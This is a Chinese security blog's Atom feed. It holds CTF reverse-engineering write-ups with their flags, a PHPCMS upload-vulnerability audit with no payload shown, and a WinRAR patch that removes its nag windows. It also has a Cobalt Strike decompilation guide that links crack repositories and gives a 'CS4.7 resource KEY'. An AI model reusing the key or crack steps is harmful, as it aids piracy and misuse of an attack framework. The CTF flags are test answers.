<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TPA HACK-NOTE</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-10-25T07:09:20.689Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CobaltStrike二开-Day1</title>
    <link href="http://example.com/posts/2878512895.html"/>
    <id>http://example.com/posts/2878512895.html</id>
    <published>2024-10-18T01:45:51.000Z</published>
    <updated>2024-10-25T07:09:20.689Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CobaltStrike二开-Day1"><a href="#CobaltStrike二开-Day1" class="headerlink" title="CobaltStrike二开-Day1"></a>CobaltStrike二开-Day1</h1><p>准备工具：IDEA、CobaltStrike</p><p>CobaltStrike校验：<a href="https://verify.cobaltstrike.com/">https://verify.cobaltstrike.com/</a></p><h2 id="cobaltstrike-jar反编译"><a href="#cobaltstrike-jar反编译" class="headerlink" title="cobaltstrike.jar反编译"></a>cobaltstrike.jar反编译</h2><p>准备：java-decompiler.jar</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20241018095537587.png" alt="image-20241018095537587"></p><p>目录结构cs_bin文件夹放入cobaltstrike.jar</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20241018095805965.png" alt="image-20241018095805965"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20241018095815701.png" alt="image-20241018095815701"></p><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dsg=true cs_bin/cobaltstrike.jar cs_src</span><br><span class="line"></span><br><span class="line">1. java</span><br><span class="line">这是调用Java的命令，用于执行Java程序。后面的参数指定了类路径和要执行的类。</span><br><span class="line"></span><br><span class="line">2. -cp java-decompiler.jar</span><br><span class="line">-cp 表示“类路径”（classpath），它指定Java运行时应该在哪些地方查找需要加载的类。在这里，类路径被设置为 java-decompiler.jar，这意味着 java-decompiler.jar 文件中包含了需要运行的类。</span><br><span class="line"></span><br><span class="line">3. org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler</span><br><span class="line">这是要运行的类的完整限定名（fully qualified name）。ConsoleDecompiler 是 org.jetbrains.java.decompiler.main.decompiler 包中的一个类，这个类是Java反编译器（JD-GUI的一部分）的命令行接口，用于将编译过的 .class 文件转换回源代码。</span><br><span class="line"></span><br><span class="line">4. -dgs=true</span><br><span class="line">-dgs 是 ConsoleDecompiler 类的一个选项，表示是否在反编译输出中生成辅助信息。true 表示启用此选项。</span><br><span class="line"></span><br><span class="line">dgs 全称为 decompile generic signatures，即是否反编译通用签名信息，通常是用于显示类型参数（泛型）的完整信息。</span><br><span class="line">5. cs_bin/cobaltstrike.jar</span><br><span class="line">这是需要反编译的目标 .jar 文件的路径。在这个例子中，cs_bin/cobaltstrike.jar 是被反编译的文件。</span><br><span class="line"></span><br><span class="line">6. cs_src/</span><br><span class="line">这是输出的目标目录。在这个例子中，反编译后的 .java 源代码文件将被输出到 cs_src/ 目录中。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20241018100844760.png" alt="image-20241018100844760"></p><p>在cs_src目录下生成的是cobaltstrike.jar</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20241018100916672.png" alt="image-20241018100916672"></p><p>新建IDEA项目，目录结构如下</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20241018101600326.png" alt="image-20241018101600326"></p><p>decompiled_src:</p><p>cs_src\cobaltstrike.jar<code> 解压到</code>erkaiCS\decompiled_src</p><p>lib:</p><p><code>cs_bin\cobaltstrike.jar</code> 拷贝到 <code>\erkaiCS\lib</code></p><h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://www.cnblogs.com/XuyeZi/p/16505470.html">https://www.cnblogs.com/XuyeZi/p/16505470.html</a></p><p><a href="https://blog.csdn.net/r250414958/article/details/124641185">https://blog.csdn.net/r250414958/article/details/124641185</a></p><p><a href="https://38-5s-organization.gitbook.io/cobalt-strike-start">https://38-5s-organization.gitbook.io/cobalt-strike-start</a></p><p><a href="https://blog.aabyss.cn/post-157.html">https://blog.aabyss.cn/post-157.html</a></p><p><a href="https://github.com/kyxiaxiang/CrackSleeve4.7">https://github.com/kyxiaxiang/CrackSleeve4.7</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CS4.7 资源KEY：8638B511E05B557BF970C418356D44F4</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CobaltStrike二开-Day1</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-[HDCTF2019]Maze-reverse-writeup</title>
    <link href="http://example.com/posts/2859762444.html"/>
    <id>http://example.com/posts/2859762444.html</id>
    <published>2024-09-29T07:45:36.000Z</published>
    <updated>2024-10-25T07:09:20.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HDCTF2019-Maze"><a href="#HDCTF2019-Maze" class="headerlink" title="[HDCTF2019]Maze"></a>[HDCTF2019]Maze</h1><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929154615231.png" alt="image-20240929154615231"></p><p>打开程序</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929154629074.png" alt="image-20240929154629074"></p><p>查壳</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929154716775.png" alt="image-20240929154716775"></p><p>查壳为UPX壳，进行UPX脱壳</p><p><a href="https://github.com/upx/upx">https://github.com/upx/upx</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx.exe -d E:\CTF\REVERSE\maze_behind_junk.exe</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929155431629.png" alt="image-20240929155431629"></p><p>重新查壳发现脱壳成功</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929155508187.png" alt="image-20240929155508187"></p><p>使用IDA打开程序，进入main函数，发现jnz跳转和call指令，该段call指令为明显花指令</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929160657781.png" alt="image-20240929160657781"></p><p>对其进行NOP手脱花指令，将jnz和E8字节码NOP，首先使用快捷键D恢复字节数据再NOP</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929160845165.png" alt="image-20240929160845165"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929160948019.png" alt="image-20240929160948019"></p><p>之后使用F5恢复伪代码，恢复失败。使用鼠标将红色代码选中，使用快捷键P声明为函数，之后可以F5恢复成伪代码</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929161442489.png" alt="image-20240929161442489"></p><p>这是一道maze迷宫题，经分析判断asc_408078为x轴坐标，dword_40807C为y轴坐标，初始坐标为（7，0）最终坐标为（5，-4），最多输入字符串长度14，wsad对应上下左右键</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929162852962.png" alt="image-20240929162852962"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929162939790.png" alt="image-20240929162939790"></p><p>经分析该代码F5伪代码翻译如下</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929163047637.png" alt="image-20240929163047637"></p><p>通过字符串窗口找到迷宫字符串</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929164352923.png" alt="image-20240929164352923"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  0123456789</span><br><span class="line"> 0*******+**</span><br><span class="line">-1******* **</span><br><span class="line">-2****    **</span><br><span class="line">-3**   *****</span><br><span class="line">-4** **F****</span><br><span class="line">-5**    ****</span><br><span class="line">-6**********</span><br><span class="line"></span><br><span class="line">经推测+为初始位置（7，0）</span><br><span class="line">那么F就为Flag最终位置（5，-4）</span><br><span class="line">从+到F的位置使用方向盘为ssaaasaassdddw</span><br><span class="line"></span><br><span class="line">那么最终得到flag为：flag&#123;ssaaasaassdddw&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BUUCTF-[HDCTF2019]Maze-reverse-writeup</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHPCMS前台文件上传漏洞代码审计</title>
    <link href="http://example.com/posts/1158605305.html"/>
    <id>http://example.com/posts/1158605305.html</id>
    <published>2024-09-29T03:12:19.000Z</published>
    <updated>2024-10-25T07:09:20.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHPCMS前台文件上传漏洞代码审计"><a href="#PHPCMS前台文件上传漏洞代码审计" class="headerlink" title="PHPCMS前台文件上传漏洞代码审计"></a>PHPCMS前台文件上传漏洞代码审计</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官网源码下载：<a href="https://www.phpcmsv9.cn/index.html">https://www.phpcmsv9.cn/index.html</a></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929111311079.png" alt="image-20240929111311079"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929112932254.png" alt="image-20240929112932254"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929113020874.png" alt="image-20240929113020874"></p><p>php.ini</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929113122695.png" alt="image-20240929113122695"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929113740906.png" alt="image-20240929113740906"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929113902077.png" alt="image-20240929113902077"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929120138430.png" alt="image-20240929120138430"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929120202490.png" alt="image-20240929120202490"><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929120311125.png" alt="image-20240929120311125"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929120405083.png" alt="image-20240929120405083"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929120433181.png" alt="image-20240929120433181"></p><p>前台</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929120506548.png" alt="image-20240929120506548"></p><p>后台</p><p><a href="http://www.myphpcms.com/index.php?m=admin&c=index&a=login&pc_hash=">http://www.myphpcms.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=</a></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929120526297.png" alt="image-20240929120526297"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>会员注册中心界面，填写表单进行提交，使用burp抓包</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929133703914.png" alt="image-20240929133703914"></p><p>数据包如下</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240929133927062.png" alt="image-20240929133927062"></p>]]></content>
    
    
    <summary type="html">PHPCMS前台文件上传漏洞代码审计</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-[FlareOn1]Bob Doge-writeup</title>
    <link href="http://example.com/posts/583387801.html"/>
    <id>http://example.com/posts/583387801.html</id>
    <published>2024-09-25T08:55:59.000Z</published>
    <updated>2024-10-25T07:09:20.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-FlareOn1-Bob-Doge-writeup"><a href="#BUUCTF-FlareOn1-Bob-Doge-writeup" class="headerlink" title="BUUCTF-[FlareOn1]Bob Doge-writeup"></a>BUUCTF-[FlareOn1]Bob Doge-writeup</h1><p>查看PE基本信息，无壳C#开发</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925172418595.png" alt="image-20240925172418595"></p><p>程序双击打开如下</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925172458195.png" alt="image-20240925172458195"></p><p>正常点击DECODE!按键会是这样</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925172759382.png" alt="image-20240925172759382"></p><p>使用dnSpy打开程序发现疑似decode相关按键函数，F2下断点，点击DECODE!按钮，在内存中读取到text的值为flag</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925172550449.png" alt="image-20240925172550449"></p><p>最终flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3rmahg3rd.b0b.d0ge@flare-on.com&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BUUCTF-[FlareOn1]Bob Doge-writeup</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-[NewStarCTF 公开赛赛道]Hello_Reverse</title>
    <link href="http://example.com/posts/2564663433.html"/>
    <id>http://example.com/posts/2564663433.html</id>
    <published>2024-09-25T08:28:07.000Z</published>
    <updated>2024-10-25T07:09:20.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-公开赛赛道-Hello-Reverse"><a href="#NewStarCTF-公开赛赛道-Hello-Reverse" class="headerlink" title="[NewStarCTF 公开赛赛道]Hello_Reverse"></a>[NewStarCTF 公开赛赛道]Hello_Reverse</h1><p>IDA伪代码</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925164630951.png" alt="image-20240925164630951"></p><p>找到疑似flag部分3vers1ng_w0rld}</p><p>在字符串窗口找到另一部分</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925165225877.png" alt="image-20240925165225877"></p><p>拼接得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;h3llo_r3vers1ng_w0rld&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BUUCTF-[NewStarCTF 公开赛赛道]Hello_Reverse</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界4星题mfc逆向-200-writeup</title>
    <link href="http://example.com/posts/296192511.html"/>
    <id>http://example.com/posts/296192511.html</id>
    <published>2024-09-25T02:44:15.000Z</published>
    <updated>2024-10-25T07:09:20.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="攻防世界4星题mfc逆向-200-writeup"><a href="#攻防世界4星题mfc逆向-200-writeup" class="headerlink" title="攻防世界4星题mfc逆向-200-writeup"></a>攻防世界4星题mfc逆向-200-writeup</h1><p>提示Flag就在控件里</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925104447448.png" alt="image-20240925104447448"></p><p>程序加了VMP的壳，脱壳比较困难</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925104438349.png" alt="image-20240925104438349"></p><p>使用spy++工具对空间窗口进行分析，发现类名很特殊</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925105156663.png" alt="image-20240925105156663"></p><p>使用专用MFC xspy工具分析控件，发现一条自定义消息0464</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925105414236.png" alt="image-20240925105414236"></p><p>向这个空间句柄发送0464消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//注意是MFC运行。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HWND h = FindWindowA(<span class="string">&quot;944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//HWND h = FindWindowA(NULL, &quot;Flag就在控件里&quot;);</span></span><br><span class="line"><span class="comment">//HWND h = FindWindowA(&quot;944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b&quot;, &quot;Flag就在控件里&quot;);</span></span><br><span class="line"><span class="comment">//这里用到两个关键函数，一个是获取窗口句柄函数，第二个就是根据句柄发送消息函数。获取句柄的FindWindowA中第一个可以传入类名，第二个可以传入标题，因为我们两个都有，所以任意一个都可以锁定程序窗口。</span></span><br><span class="line"><span class="keyword">if</span> (h)</span><br><span class="line">&#123;</span><br><span class="line">SendMessage(h, <span class="number">0x464</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//发送函数中第二个是区别其他消息的常量值，这里题目用了自定义常量值，所以我们要对应一致。</span></span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>控件发生变化出现{I am a Des key}</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925105726685.png" alt="image-20240925105726685"></p><p>进行DES解密获得flag</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240925110716874.png" alt="image-20240925110716874"></p>]]></content>
    
    
    <summary type="html">攻防世界4星题mfc逆向-200-writeup</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-REVERSE-简单注册器-Writeup</title>
    <link href="http://example.com/posts/2827592229.html"/>
    <id>http://example.com/posts/2827592229.html</id>
    <published>2024-09-23T14:39:01.000Z</published>
    <updated>2024-10-25T07:09:20.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-REVERSE-简单注册器-Writeup"><a href="#BUUCTF-REVERSE-简单注册器-Writeup" class="headerlink" title="BUUCTF-REVERSE-简单注册器-Writeup"></a>BUUCTF-REVERSE-简单注册器-Writeup</h1><p>下载后发现是个apk文件</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923224025801.png" alt="image-20240923224025801"></p><p>修改后缀为zip,查看静态文件</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923224053143.png" alt="image-20240923224053143"></p><p>没有flag信息，使用jadx对classes.dex文件进行逆向分析，在MainActivity代码中找到flag相关部分</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923224201963.png" alt="image-20240923224201963"></p><p>该算法可以直接正向计算，使用AI进行解答</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923224428470.png" alt="image-20240923224428470"></p><p>最后结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;59acc538825054c7de4b26440c0999dd&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BUUCTF-REVERSE-简单注册器-Writeup</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>逆向分析WINRAR去除广告弹窗</title>
    <link href="http://example.com/posts/3738048065.html"/>
    <id>http://example.com/posts/3738048065.html</id>
    <published>2024-09-23T12:17:23.000Z</published>
    <updated>2024-10-25T07:09:20.719Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向分析WINRAR去除广告弹窗"><a href="#逆向分析WINRAR去除广告弹窗" class="headerlink" title="逆向分析WINRAR去除广告弹窗"></a>逆向分析WINRAR去除广告弹窗</h1><p>在打开WINRAR时总会出现弹窗广告</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923201759681.png" alt="image-20240923201759681"></p><p>使用spyxx定位广告窗口：</p><p>搜索&#x3D;&gt;搜索窗口&#x3D;&gt;移动图标到广告弹窗&#x3D;&gt;确定</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923202557450.png" alt="image-20240923202557450"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923202441573.png" alt="image-20240923202441573"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923202616588.png" alt="image-20240923202616588"></p><p>右键属性，标题WinRAR、窗口类RarReminder</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923202810969.png" alt="image-20240923202810969"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923202721176.png" alt="image-20240923202721176"></p><p>Windows创建窗口：</p><p>RegisteClass创建窗口类 &#x3D;&gt; 窗口类调用CreateWindow创建窗口</p><p>思路：找到RarReminder窗口类CreateWindow去除</p><p>使用APIMonitor监听CreateWindow函数：</p><p>Ctrl+F搜索CreateWindow，将函数进行勾选</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923203234109.png" alt="image-20240923203234109"></p><p>监视进程</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923203340699.png" alt="image-20240923203340699"></p><p>找到RarReminder窗口类</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923203532725.png" alt="image-20240923203532725"></p><p>通过调用堆栈窗口获得CreateWindow地址和偏移量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">address: 0x00007ff673defbf8</span><br><span class="line">offset: 0xafbf8</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923203721192.png" alt="image-20240923203721192"></p><p>使用IDA打开WINRAR，找到address：</p><p>IDA与API Monitor分析的加载位置可能不一样，使用ProcExp分析加载基地址，再利用IDA进行rebase重定位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007FF673D40000</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923204712388.png" alt="image-20240923204712388"></p><p>IDA rebase:</p><p>Edit&#x3D;&gt;Segments&#x3D;&gt;Rebase program</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923204913706.png" alt="image-20240923204913706"></p><p>快捷键g：跳转到CreateWindow地址：0x00007ff673defbf8</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923205606174.png" alt="image-20240923205606174"></p><p>F5反编译伪代码</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923205739512.png" alt="image-20240923205739512"></p><p>CreateWindow所在函数为sub_7FF673DEF7B8：7FF673DEF7B8为地址</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923205829717.png" alt="image-20240923205829717"></p><p>G跳转到函数开头位置</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923205944206.png" alt="image-20240923205944206"></p><p>Ctrl+X：看哪些地方在调用这个函数</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923210035487.png" alt="image-20240923210035487"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923210305300.png" alt="image-20240923210305300"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923210248422.png" alt="image-20240923210248422"></p><p>也可以从 API Monitor的调用堆栈窗口看出</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923210338484.png" alt="image-20240923210338484"></p><p>可以将函数调用行汇编的call指令替换为NOP指令，但可能会导致出现一些问题 &#x3D;&gt; 直接去除CreateWindowExw和SetWindowPos &#x3D;&gt;将这两个函数机器码改为NOP 90</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FF15C09E0700</span><br><span class="line">FF15C29E0700</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923211019384.png" alt="image-20240923211019384"></p><p>WinHex搜索</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923211905521.png" alt="image-20240923211905521"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923212005809.png" alt="image-20240923212005809"></p><p>成功去除广告弹窗，但又出现另一个弹窗，该窗口为对话框调用函数为DialogBox</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923212042429.png" alt="image-20240923212042429"></p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923212327799.png" alt="image-20240923212327799"></p><p>同样在WinHex中去除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FF15FF9E0700</span><br></pre></td></tr></table></figure><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923212434660.png" alt="image-20240923212434660"></p><p>经过修改后成功去除弹窗</p><p><img src="C:\Users\62747\AppData\Roaming\Typora\typora-user-images\image-20240923212507095.png" alt="image-20240923212507095"></p>]]></content>
    
    
    <summary type="html">逆向分析WINRAR去除广告弹窗</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>spring-framework目录遍历漏洞（cve-2024-38816）代码审计</title>
    <link href="http://example.com/posts/1764323740.html"/>
    <id>http://example.com/posts/1764323740.html</id>
    <published>2024-09-23T08:52:10.000Z</published>
    <updated>2024-10-25T07:09:20.715Z</updated>
    
